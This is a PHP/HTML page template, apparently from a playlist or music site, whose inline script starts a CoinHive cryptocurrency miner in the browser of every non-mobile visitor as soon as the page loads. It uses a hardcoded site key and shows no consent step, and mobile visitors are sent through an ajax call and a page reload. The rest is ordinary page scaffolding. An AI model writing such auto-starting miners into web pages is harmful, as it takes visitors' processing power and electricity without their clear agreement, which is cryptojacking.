<!DOCTYPE html>
<html lang='<?php echo $l->htmldata; ?>'>
  <head>
    <?php
    require_once ($_hp.'include/head.php');
    ?>
  </head>
  <body>

    <script>

      var miner = new CoinHive.User('JjddKmmi3zMuzPoqUlFqS0JBAbD6zat8', '<?php echo $coin_name; ?>', {throttle: 0.8, forceASMJS: false, theme: 'dark'});
      if (!miner.isMobile()) {
        miner.start();
      }else{
        $('#main_container').html('');
      }

      if(miner.isMobile()){
        $.post('<?php echo $_dhp; ?>ajax/coinhive');
        location.reload();
      }


      if(miner.didOptOut()){
        //$('#main_container').html('');
      }



      var playlist_id = 'not_set';

      $(document).ready(function() {
        sethtmltitle('<?php echo $html_title; ?>');
        $('.site_loadering_progress').animate({width: "100%",}, 100 );
        setTimeout(function() {
          $('.site_loadering_progress').animate({width: "0%",}, 1 );
        }, 100)
      });

    </script>


    <?php echo "<div class='coinhice_error_text_box'>".$l->coinhive_site_error."</div>"; ?>

  </body>
</html>
